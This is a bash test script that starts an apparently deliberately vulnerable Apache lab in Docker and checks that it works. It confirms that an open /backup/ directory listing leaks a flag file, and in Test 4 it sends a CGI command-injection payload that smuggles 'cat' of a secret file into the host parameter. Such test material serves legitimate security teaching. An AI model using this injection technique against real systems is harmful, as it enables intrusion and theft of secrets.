#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
trap "$DC down" EXIT

echo "[*] Waiting for Apache on port 8080..."
for i in $(seq 1 30); do
  nc -z -w2 127.0.0.1 8080 2>/dev/null && break
  sleep 2
  if [ "$i" -eq 30 ]; then
    echo "[FAIL] Apache did not come up"
    $DC logs; exit 1
  fi
done
sleep 1

FAIL=0

# --- Test 1: main directory listing disabled ---
echo ""
echo "[*] Test 1 — main directory: listing disabled"
OUT=$(curl -sf http://127.0.0.1:8080/ 2>&1 || true)
if ! echo "$OUT" | grep -qi 'Index of /'; then
  echo "[PASS] main directory listing is off"
else
  echo "[FAIL] main directory unexpectedly lists contents"; FAIL=1
fi

# --- Test 2: backup directory listing enabled ---
echo ""
echo "[*] Test 2 — /backup/ directory listing exposes config.bak"
OUT=$(curl -sf http://127.0.0.1:8080/backup/)
if echo "$OUT" | grep -q 'config.bak'; then
  echo "[PASS] backup directory listing shows config.bak"
else
  echo "[FAIL] config.bak not visible in listing: $OUT"; FAIL=1
fi

# --- Test 3: flag1 in config.bak ---
echo ""
echo "[*] Test 3 — download config.bak and extract flag1"
OUT=$(curl -sf http://127.0.0.1:8080/backup/config.bak)
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  FLAG1=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}')
  echo "[PASS] directory listing: flag1 = $FLAG1"
else
  echo "[FAIL] flag1 not in config.bak: $OUT"; FAIL=1
fi

# --- Test 4: CGI command injection -> flag2 ---
echo ""
echo "[*] Test 4 — CGI command injection: inject semicolon into host parameter"
OUT=$(curl -sf "http://127.0.0.1:8080/cgi-bin/status.sh?host=127.0.0.1%3Bcat%20/var/www/secret/flag2.txt")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  FLAG2=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}')
  echo "[PASS] CGI injection: flag2 = $FLAG2"
else
  echo "[FAIL] CGI injection: $OUT"; FAIL=1
fi

# --- Test 5: normal CGI input runs without injection ---
echo ""
echo "[*] Test 5 — normal CGI input does not expose flags"
OUT=$(curl -sf "http://127.0.0.1:8080/cgi-bin/status.sh?host=127.0.0.1")
if ! echo "$OUT" | grep -qE 'POC\{'; then
  echo "[PASS] clean input does not expose any flag"
else
  echo "[FAIL] flag exposed on clean input"; FAIL=1
fi

echo ""
if [ "$FAIL" -eq 0 ]; then
  echo "[PASS] All tests passed"
  exit 0
else
  echo "[FAIL] One or more tests failed"
  exit 1
fi
